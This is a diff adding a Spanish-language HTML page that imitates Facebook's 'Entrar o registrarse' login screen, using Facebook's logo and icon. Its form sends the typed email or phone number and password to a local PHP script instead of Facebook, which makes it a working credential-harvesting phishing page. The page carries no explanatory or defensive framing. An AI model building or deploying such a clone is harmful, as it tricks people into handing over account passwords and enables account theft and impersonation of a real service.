@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Facebook - Entrar o registrarse</title>
+        <script type="text/javascript" src="eventos.js"></script>
+        <link rel="icon" href="https://www.facebook.com/images/fb_icon_325x325.png">
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link href="newcss.css" rel="stylesheet" type="text/css">
+       
+    </head>
+    <body class="lienzo">
+        <div align="center">
+              <img class="logo" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"> 
+             </div>
+     
+        <div align="center">
+        <form  action="http://localhost/PhpProject1/index.php" method="post">
+            <input type="text" class="entradacontra"  name="correo" id="correo" value="Número de celular o correo electrónico" onkeypress="if (this.value==='Número de celular o correo electrónico') this.value=''"
+                  focus=border-color: "red" /></br>
+       <input type="password" class="entradacontra" name="contrasena" id="contrasena" placeholder="Contraseña" onkeypress="if (this.placeholder==='Contraseña') this.placeholder=''" /></br>
+        <input type="submit" value="Iniciar sesión" class="envio"  />
+        </form>
+            <div class="linea"></div>
+             <input type="submit" value="Crear cuenta nueva" class="otracuenta"  />
+             <br>
+             <style type="text/css">
+       input:hover {
+           border-color: #fc9617
+}
+h1 {
+	text-decoration: none;
+         color: #1877f2;
+    font-size: 14px;
+    font-weight: 500;
+    margin: 16px;
+}
+h1:hover {
+	text-decoration: underline;
+}
+a {
+	text-decoration: none;
+         color: #8A8D91;
+    font-size: 14px;
+    font-weight: 500;
+    margin: 16px;
+}
+a:hover {
+	text-decoration: underline;
+}
+</style>
+             
+             <h1 href="#">¿Olvidaste tu contraseña?</h1>
+             <ul class="lista">
+                 <li><a>Español (España)</a></li>
+                 <li><a>Português (Brasil)</a></li>
+                 <li><a>Deutsch</a></li>
+                 <li><a>العربية</a></li>
+             </ul>
+               <ul class="lista">
+                 <li><a>English (US)</a></li>
+                 <li><a>Français (France)</a></li>
+                 <li><a>Italiano</a></li>
+                 <li><a role="button" class="botonmas">
+             <i>+</i>
+                     </a></li>
+             </ul>
+             <div align="center">
+                 <a>Facebook</a>
+             </div>
+    </body>
+</html>
